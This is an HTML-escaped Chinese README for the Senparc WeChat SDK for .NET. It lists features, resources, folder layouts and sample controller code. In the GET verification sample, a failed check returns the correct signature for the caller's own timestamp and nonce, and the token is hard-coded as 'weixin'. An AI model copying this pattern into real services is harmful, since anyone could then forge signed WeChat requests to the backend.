&lt;p&gt;提示：&lt;br&gt;&lt;/p&gt; &#xA; &lt;ol&gt; &#xA;  &lt;li&gt;&lt;img src=&#34;https://img.shields.io/badge/3.5-Y-yellowgreen.svg?sanitize=true&#34; alt=&#34;.NET 3.5&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/4.0-Y-yellowgreen.svg?sanitize=true&#34; alt=&#34;.NET 4.0&#34;&gt; 最后一个稳定版&lt;a href=&#34;https://github.com/JeffreySu/WeiXinMPSDK/releases/tag/v16.6.15&#34;&gt;点击这里&lt;/a&gt;，自 2019 年 5 月 1 日起停止更新。&lt;br&gt;&lt;/li&gt; &#xA;  &lt;li&gt;.NET 4.5 版本更新计划于 2024 年 12 月 31 日停止更新（2021 年 11 月 7 日起最低支持 .NET 4.5.1），新项目建议使用 .NET 3.1 或 .NET 6.0+。&lt;/li&gt; &#xA; &lt;/ol&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;功能支持&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;已经支持大部分微信 8.x API，包括微信支付、自定义菜单/个性化菜单、模板信息接口、素材上传接口、群发接口、多客服接口、支付接口、微小店接口、卡券接口、发票接口等等。&lt;/li&gt; &#xA; &lt;li&gt;已支持微信公众号、小程序、企业号、开放平台等各个模块。&lt;/li&gt; &#xA; &lt;li&gt;已经支持用户会话上下文（解决服务器无法使用 Session 处理用户信息的问题）。&lt;/li&gt; &#xA; &lt;li&gt;已经全面支持微信公众号、小程序、企业号（企业微信）、微信支付V2/V3、开放平台的最新 API。&lt;/li&gt; &#xA; &lt;li&gt;已经支持分布式缓存及缓存策略扩展（默认支持：本地缓存、Redis、Memcached，可自由扩展）。&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;目前官方的 API 都已完美集成，除非有特殊说明，所有升级都会尽量确保向下兼容，所以已经发布的版本请放心使用或直接升级（覆盖）最新的 dll，&lt;a href=&#34;https://github.com/JeffreySu/WeiXinMPSDK/tree/master/src/Senparc.Weixin.MP.BuildOutPut&#34;&gt;Release生成目录&lt;/a&gt;，建议使用 &lt;a href=&#34;https://www.nuget.org/&#34;&gt;Nuget&lt;/a&gt; 进行更新。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;私人定制你的微信项目 Sample&lt;/h2&gt; &#xA;&lt;p&gt;Web 版：&lt;a href=&#34;https://www.cnblogs.com/szw/p/WeChatSampleBuilder-V2.html#Web-WeChatSampleBuilder&#34; target=&#34;_blank&#34;&gt;查看教程&lt;/a&gt;。&lt;/p&gt; &#xA;&lt;img src=&#34;https://sdk.weixin.senparc.com/images/WeChatSampleBuilder-v0.2.0-web.png?t=1&#34; width=&#34;700&#34; alt=&#34;WeChatSampleBuilder&#34;&gt; &#xA;&lt;!-- &#xA;2. 桌面版：登录 &lt;a href=&#34;https://weixin.senparc.com/User&#34; target=&#34;_blank&#34;&gt;https://weixin.senparc.com/User&lt;/a&gt;下载 WeChatSampleBuilder 工具，并查看使用说明。&#xA;&#xA;&lt;img src=&#34;https://sdk.weixin.senparc.com/images/WeChatSampleBuilder-v0.2.0.png?t=1&#34; width=&#34;700&#34; alt=&#34;WeChatSampleBuilder&#34; /&gt;&#xA;--&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;注意：使用 WeChatSampleBuilder 工具只是方便您简化 Sample 代码进行测试和学习，并不能帮助您生成完整的带有业务逻辑的生产环境项目。如需构建生产环境项目，请参考完整的 Demo 或其他教程，推荐使用已有的系统框架进行项目搭建，如 &lt;a href=&#34;https://github.com/NeuCharFramework/NCF&#34;&gt;NeuCharFramework&lt;/a&gt;。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;资源&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;官网地址：&lt;a href=&#34;https://weixin.senparc.com/&#34;&gt;https://weixin.senparc.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;在线 Demo 地址：&lt;a href=&#34;https://sdk.weixin.senparc.com/&#34;&gt;https://sdk.weixin.senparc.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;微信开发系列教程：&lt;a href=&#34;https://www.cnblogs.com/szw/p/weixin-course-index.html&#34;&gt;https://www.cnblogs.com/szw/p/weixin-course-index.html&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;微信技术交流社区：&lt;a href=&#34;https://weixin.senparc.com/QA&#34;&gt;https://weixin.senparc.com/QA&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;自定义菜单在线编辑工具：&lt;a href=&#34;https://sdk.weixin.senparc.com/Menu&#34;&gt;https://sdk.weixin.senparc.com/Menu&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;在线消息测试工具：&lt;a href=&#34;https://sdk.weixin.senparc.com/SimulateTool&#34;&gt;https://sdk.weixin.senparc.com/SimulateTool&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;缓存测试工具：&lt;a href=&#34;https://sdk.weixin.senparc.com/Cache/Test&#34;&gt;https://sdk.weixin.senparc.com/Cache/Test&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;chm帮助文档下载：&lt;a href=&#34;https://sdk.weixin.senparc.com/Document&#34;&gt;https://sdk.weixin.senparc.com/Document&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;源代码及最新更新：&lt;a href=&#34;https://github.com/JeffreySu/WeiXinMPSDK&#34;&gt;https://github.com/JeffreySu/WeiXinMPSDK&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;微信开发资源集合：&lt;a href=&#34;https://github.com/JeffreySu/WeixinResource&#34;&gt;https://github.com/JeffreySu/WeixinResource&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;《微信开发深度解析》阅读辅助系统：&lt;a href=&#34;https://book.weixin.senparc.com&#34;&gt;https://book.weixin.senparc.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;购买《微信开发深度解析》：&lt;a href=&#34;https://book.weixin.senparc.com/book/link?code=github-homepage-resource&#34;&gt;https://item.jd.com/12220004.html&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;《微信公众号 + 小程序快速开发》视频教程：&lt;a href=&#34;https://github.com/JeffreySu/WechatVideoCourse&#34;&gt;https://github.com/JeffreySu/WechatVideoCourse&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;技术交流QQ群：&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;5群（公众号）：377815480&lt;br&gt; 14群（视频课程学员群）：588231256&lt;br&gt; 10群（分布式缓存群）：246860933&lt;br&gt; 12群（微信小程序）：108830388&lt;br&gt; 16群（开放平台）：860626938&lt;br&gt; &lt;em&gt;&lt;code&gt;以下群已满：&lt;/code&gt;&lt;/em&gt;&lt;br&gt; &lt;code&gt;1群：300313885（已满），2群：293958349（已满），3群：342319110（已满）&lt;/code&gt;&lt;br&gt; &lt;code&gt;4群：372212092（已满），6群：425898825（已满）&lt;/code&gt;&lt;br&gt; &lt;code&gt;7群：482942254（已满），8群：106230270（已满），9群：539061281（已满）&lt;/code&gt;&lt;br&gt; &lt;code&gt;11群：553198593（已满），13群：183424136（开放平台，已满），15群：289181996（已满）&lt;/code&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;业务联系QQ：498977166&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;!-- * 新浪微博：[@苏震巍](http://weibo.com/jeffreysu1984) --&gt; &#xA;&lt;p&gt;如果这个项目对您有用，我们欢迎各方任何形式的捐助，也包括参与到项目代码更新或意见反馈中来。谢谢！&lt;/p&gt; &#xA;&lt;p&gt;资金捐助：&lt;a href=&#34;http://sdk.weixin.senparc.com#donate&#34;&gt;进入&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Senparc 官方图书教程&lt;/h2&gt; &#xA;&lt;img src=&#34;https://sdk.weixin.senparc.com/images/book-cover-front-small-3d.png&#34; width=&#34;400&#34; align=&#34;right&#34;&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;由 Jeffrey Su 和盛派团队耗时 2 年完成的微信开发图书已经出版，书名：《微信开发深度解析：公众号、小程序高效开发秘籍》，全书配套辅助阅读系统已经上线： &lt;a href=&#34;http://book.weixin.senparc.com&#34;&gt;BookHelper&lt;/a&gt;。&lt;br&gt; 欢迎购买正版图书：&lt;a href=&#34;https://book.weixin.senparc.com/book/link?code=github-homepage&#34;&gt;【购买正版】&lt;/a&gt;&lt;br&gt; 图书出版时的代码版本快照见分支 &lt;a href=&#34;https://github.com/JeffreySu/WeiXinMPSDK/tree/BookVersion1&#34;&gt;BookVersion1&lt;/a&gt;。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;Senparc 官方视频教程&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;为了帮助大家更直观地了解微信开发细节，同时结合《微信开发深度解析》图书进行学习，我们成立“盛派课堂”小组，开设了微信开发视频课程，帮助大家从多个维度学习微信开发以及 .NET 开发过程中的诸多技巧。&lt;br&gt; 视频包含两大部分：&lt;br&gt;&lt;/p&gt; &#xA; &lt;ol&gt; &#xA;  &lt;li&gt;微信开发基础技能&lt;br&gt;&lt;/li&gt; &#xA;  &lt;li&gt;公众号及小程序案例实战&lt;br&gt;&lt;/li&gt; &#xA; &lt;/ol&gt; &#xA; &lt;p&gt;共计 60 课时，配有番外篇。&lt;br&gt; 目前视频已经在网易云课堂上线，课程制作精良、内容充实，被选为“A”级课程，&lt;a href=&#34;https://book.weixin.senparc.com/book/videolinknetease?code=github-homepage&#34;&gt;【观看视频】&lt;/a&gt;，&lt;a href=&#34;https://github.com/JeffreySu/WechatVideoCourse&#34;&gt;【查看课程代码及课件】&lt;/a&gt;。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h3&gt;关注测试账号体验功能（SenparcRobot）：&lt;/h3&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;盛派网络小助手公众号&lt;/th&gt; &#xA;   &lt;th&gt;盛派网络小助手小程序&lt;/th&gt; &#xA;   &lt;th&gt;BookHelper&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://sdk.weixin.senparc.com/Images/qrcode.jpg&#34; width=&#34;258&#34;&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://sdk.weixin.senparc.com/Images/SenparcRobot_MiniProgram.jpg&#34; width=&#34;258&#34;&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://sdk.weixin.senparc.com/Images/qrcode-bookhelper.jpg&#34; width=&#34;258&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;如何使用 .NET Core 开发&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;当前分支包含了 .NET Framework 3.5 / 4.0 / 4.5 / 4.6.1 及 .NET Core 2.0 + 2.1 / .NET 5.0 + 6.0 的全版本代码。&lt;br&gt; 其中 .NET Framework 4.5 的 Demo 位于 &lt;code&gt;/src/Senparc.Weixin.MP.Sample&lt;/code&gt; 目录下，&lt;br&gt; .NET Core 3.1 的 Demo 位于 &lt;code&gt;/Samples/netcore3.1-mvc&lt;/code&gt; 目录下，&lt;br&gt; 【推荐】.NET 6.0（兼容 .NET 5.0） 的 Demo 位于 &lt;code&gt;/Samples/net6-mvc&lt;/code&gt; 目录下。&lt;br&gt;&lt;br&gt; 注意：以上多个 Demo 所引用的 Senparc.Weixin SDK 库源代码是完全一致的，只是在编译运行的时候会根据条自动选择输出版本。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;以下所有介绍以 .NET Framework 4.5 版本为例。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;贡献代码&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;如果需要使用或修改此项目的源代码，建议先Fork。也欢迎将您修改的通用版本Pull Request过来。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Fork&lt;/li&gt; &#xA; &lt;li&gt;创建您的特性分支 (&lt;code&gt;git checkout -b my-new-feature&lt;/code&gt;)&lt;/li&gt; &#xA; &lt;li&gt;提交您的改动 (&lt;code&gt;git commit -am &#39;Added some feature&#39;&lt;/code&gt;)&lt;/li&gt; &#xA; &lt;li&gt;将您的修改记录提交到远程 &lt;code&gt;git&lt;/code&gt; 仓库 (&lt;code&gt;git push origin my-new-feature&lt;/code&gt;)&lt;/li&gt; &#xA; &lt;li&gt;然后到 github 网站的该 &lt;code&gt;git&lt;/code&gt; 远程仓库的 &lt;code&gt;my-new-feature&lt;/code&gt; 分支下发起 Pull Request （请提交到 &lt;code&gt;Developer&lt;/code&gt; 分支，不要直接提交到 &lt;code&gt;master&lt;/code&gt; 分支）&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;项目文件夹说明（src文件夹下）&lt;/h2&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;文件夹&lt;/th&gt; &#xA;   &lt;th&gt;说明&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/src/Senparc.WebSocket/&#34;&gt;Senparc.WebSocket&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;WebSocket 模块&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/src/Senparc.Weixin.Cache&#34;&gt;Senparc.Weixin.Cache&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Senparc.Weixin.Cache.Memcached.dll 、 Senparc.Weixin.Cache.Redis.dll 等分布式缓存扩展方案&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/src/Senparc.Weixin.AspNet&#34;&gt;Senparc.Weixin.AspNet&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Senparc.Weixin.AspNet.dll 专为 Web 提供支撑的类库&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/src/Senparc.Weixin.MP.MvcExtension&#34;&gt;Senparc.Weixin.MP.MvcExtension&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Senparc.Weixin.MP.MvcExtension.dll源码，为 MVC 项目提供的扩展包&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/src/Senparc.Weixin.MP&#34;&gt;Senparc.Weixin.MP&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Senparc.Weixin.MP.dll 微信公众账号SDK源代码&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/src/Senparc.Weixin.MP.Middleware&#34;&gt;Senparc.Weixin.MP.Middleware&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Senparc.Weixin.MP.Middleware.dll 微信公众账号消息中间件源代码&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/src/Senparc.Weixin.Open&#34;&gt;Senparc.Weixin.Open&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Senparc.Weixin.Open.dll 第三方开放平台SDK源代码&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/src/Senparc.Weixin.TenPay&#34;&gt;Senparc.Weixin.TenPay&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Senparc.Weixin.TenPay.dll &amp;amp; Senparc.Weixin.TenPayV3.dll 包含微信支付 &lt;a href=&#34;https://github.com/JeffreySu/WeiXinMPSDK/tree/Developer/src/Senparc.Weixin.TenPay/Senparc.Weixin.TenPay&#34;&gt;V2&lt;/a&gt; 和 &lt;a href=&#34;https://github.com/JeffreySu/WeiXinMPSDK/tree/Developer/src/Senparc.Weixin.TenPay/Senparc.Weixin.TenPayV3&#34;&gt;V3&lt;/a&gt; 的源代码&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/src/Senparc.Weixin.Work&#34;&gt;Senparc.Weixin.Work&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Senparc.Weixin.Work.dll 企业微信SDK源代码&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/src/Senparc.Weixin.Work.Middleware&#34;&gt;Senparc.Weixin.Work.Middleware&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Senparc.Weixin.Work.Middleware.dll 企业微信消息中间件源代码&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/src/Senparc.Weixin.WxOpen&#34;&gt;Senparc.Weixin.WxOpen&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Senparc.Weixin.WxOpen.dll 微信小程序SDK源代码，包括小游戏&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/src/Senparc.Weixin.WxOpen.Middleware&#34;&gt;Senparc.Weixin.WxOpen.Middleware&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Senparc.Weixin.WxOpen.Middleware.dll 微信小程序消息中间件源代码，包括小游戏&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/src/Senparc.Weixin&#34;&gt;Senparc.Weixin&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;所有Senparc.Weixin.[x].dll 基础类库源代码&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;Sample 文件夹说明（Samples文件夹下）&lt;/h2&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;文件夹&lt;/th&gt; &#xA;   &lt;th&gt;说明&lt;/th&gt; &#xA;   &lt;th&gt;SDK 引用方式&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/Samples/MP/&#34;&gt;MP&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;公众号&lt;/td&gt; &#xA;   &lt;td&gt;源码&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/Samples/TenPayV2/&#34;&gt;TenPayV2&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;微信支付 V1 和 V2&lt;/td&gt; &#xA;   &lt;td&gt;源码&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/Samples/TenPayV3/&#34;&gt;TenPayV3&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;微信支付 V3（TenPay APIv3）&lt;/td&gt; &#xA;   &lt;td&gt;源码&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/Samples/Work/&#34;&gt;Work&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;企业微信&lt;/td&gt; &#xA;   &lt;td&gt;源码&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/Samples/WxOpen/&#34;&gt;WxOpen&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;微信小程序&lt;/td&gt; &#xA;   &lt;td&gt;源码&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/Samples/Shared&#34;&gt;Shared&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;所有 Sample 都需要用到的共享文件&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/Samples/All/&#34;&gt;All&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;包含微信公众号、小程序、微信支付、企业微信等所有功能的混合场景演示，推荐用于集成多个平台的项目参考&lt;br&gt;（进阶参考）&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;┣ &lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/Samples/All/net45-mvc&#34;&gt;All/net45-mvc&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;可以直接发布使用的Demo（.NET Framework 4.5 + ASP.NET MVC）&lt;/td&gt; &#xA;   &lt;td&gt;Nuget 包&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;┣ &lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/Samples/All/console&#34;&gt;All/console&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;命令行 Console Demo（.NET Core）&lt;/td&gt; &#xA;   &lt;td&gt;源码&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;┗ &lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/Samples/All/net6-mvc&#34;&gt;All/net6-mvc&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;可以直接发布使用的 Demo（.NET 6.0），兼容 .NET 5.0 和 .NET Core&lt;/td&gt; &#xA;   &lt;td&gt;源码&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;Senparc.Weixin.MP.Sample 中的关键代码说明&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;注：这是 MVC 项目，WebForms项 目见对应 Demo 中的 Weixin.aspx。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h3&gt;/Controllers/WeixinController.cs&lt;/h3&gt; &#xA;&lt;p&gt;下面的Token需要和微信公众平台后台设置的Token同步，如果经常更换建议写入Web.config等配置文件（实际使用过程中两列建议使用数字+英文大小写改写Token，Token一旦被破解，微信请求将很容易被伪造！）：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C#&#34;&gt;public readonly string Token = &#34;weixin&#34;;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;下面这个Action（Get）用于接收并返回微信后台Url的验证结果，无需改动。地址如：&lt;a href=&#34;http://domain/Weixin&#34;&gt;http://domain/Weixin&lt;/a&gt; 或 &lt;a href=&#34;http://domain/Weixin/Index&#34;&gt;http://domain/Weixin/Index&lt;/a&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C#&#34;&gt;/// &amp;lt;summary&amp;gt;&#xA;/// 微信后台验证地址（使用Get），微信后台的“接口配置信息”的Url填写如：http://weixin.senparc.com/weixin&#xA;/// &amp;lt;/summary&amp;gt;&#xA;[HttpGet]&#xA;[ActionName(&#34;Index&#34;)]&#xA;public ActionResult Get(PostModel postModel, string echostr)&#xA;{&#xA;    if (CheckSignature.Check(postModel.Signature, postModel.Timestamp, postModel.Nonce, Token))&#xA;    {&#xA;        return Content(echostr); //返回随机字符串则表示验证通过&#xA;    }&#xA;    else&#xA;    {&#xA;        return Content(&#34;failed:&#34; + postModel.Signature + &#34;,&#34; &#xA;            + MP.CheckSignature.GetSignature(postModel.Timestamp, postModel.Nonce, Token) + &#34;。&#34; +&#xA;            &#34;如果你在浏览器中看到这句话，说明此地址可以被作为微信公众账号后台的Url，请注意保持Token一致。&#34;);&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;上述方法中的PostModel是一个包括了了Signature、Timestamp、Nonce（由微信服务器通过请求时的Url参数传入），以及AppId、Token、EncodingAESKey等一系列内部敏感的信息（需要自行传入）的实体类，同时也会在后面用到。&lt;/p&gt; &#xA;&lt;p&gt;下面这个Action（Post）用于接收来自微信服务器的Post请求（通常由用户发起），这里的if必不可少，之前的Get只提供微信后台保存Url时的验证，每次Post必须重新验证，否则很容易伪造请求。&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C#&#34;&gt;/// &amp;lt;summary&amp;gt;&#xA;/// 用户发送消息后，微信平台自动Post一个请求到这里，并等待响应XML&#xA;/// &amp;lt;/summary&amp;gt;&#xA;[HttpPost]&#xA;[ActionName(&#34;Index&#34;)]&#xA;public ActionResult Post(PostModel postModel)&#xA;{&#xA;    if (!CheckSignature.Check(postModel.Signature, postModel.Timestamp, postModel.Nonce, Token))&#xA;    {&#xA;        return Content(&#34;参数错误！&#34;);&#xA;    }&#xA;    ...&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;如何处理微信公众账号请求？&lt;/h3&gt; &#xA;&lt;p&gt;Senparc.Weixin.MP提供了2中处理请求的方式，&lt;a href=&#34;https://github.com/JeffreySu/WeiXinMPSDK/wiki/%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E4%BF%A1%E6%81%AF%E7%9A%84%E5%B8%B8%E8%A7%84%E6%96%B9%E6%B3%95&#34;&gt;传统方法&lt;/a&gt;及使用&lt;a href=&#34;https://github.com/JeffreySu/WeiXinMPSDK/wiki/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8MessageHandler%E7%AE%80%E5%8C%96%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B&#34;&gt;MessageHandler&lt;/a&gt;处理方法（推荐）。上面两个方法在wiki中已经有比较详细的说明，这里简单举例MessageHandler的处理方法。&lt;/p&gt; &#xA;&lt;p&gt;MessageHandler的处理流程非常简单：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C#&#34;&gt;[HttpPost]&#xA;[ActionName(&#34;Index&#34;)]&#xA;public ActionResult Post(PostModel postModel)&#xA;{&#xA;    if (!CheckSignature.Check(postModel.Signature, postModel.Timestamp, postModel.Nonce, Token))&#xA;    {&#xA;        return Content(&#34;参数错误！&#34;);&#xA;    }&#xA;&#xA;    postModel.Token = Token;&#xA;    postModel.EncodingAESKey = EncodingAESKey;//根据自己后台的设置保持一致&#xA;    postModel.AppId = AppId;//根据自己后台的设置保持一致&#xA;&#xA;    var messageHandler = new CustomMessageHandler(Request.InputStream, postModel);//接收消息（第一步）&#xA;&#xA;    messageHandler.Execute();//执行微信处理过程（第二步）&#xA;&#xA;    return new FixWeixinBugWeixinResult(messageHandler);//返回（第三步）&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;整个消息除了postModel的赋值以外，接收（第一步）、处理（第二步）、返回（第三步）分别只需要一行代码。&lt;/p&gt; 